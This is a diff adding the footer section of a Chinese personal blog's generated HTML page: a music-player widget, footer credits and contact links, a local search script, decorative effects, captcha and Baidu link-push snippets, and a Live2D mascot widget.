+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="7286865560"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2023</span>
+            
+            <a href="/about" target="_blank">无心</a>
+            |&nbsp;Powered by&nbsp;梦想
+            |&nbsp;About&nbsp;我的博客
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">225.3k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="http://NoobXW.github.io" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:wangwei89677@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=3012254368" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 3012254368" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 鼠标星星特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
+            }
+        </script>
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
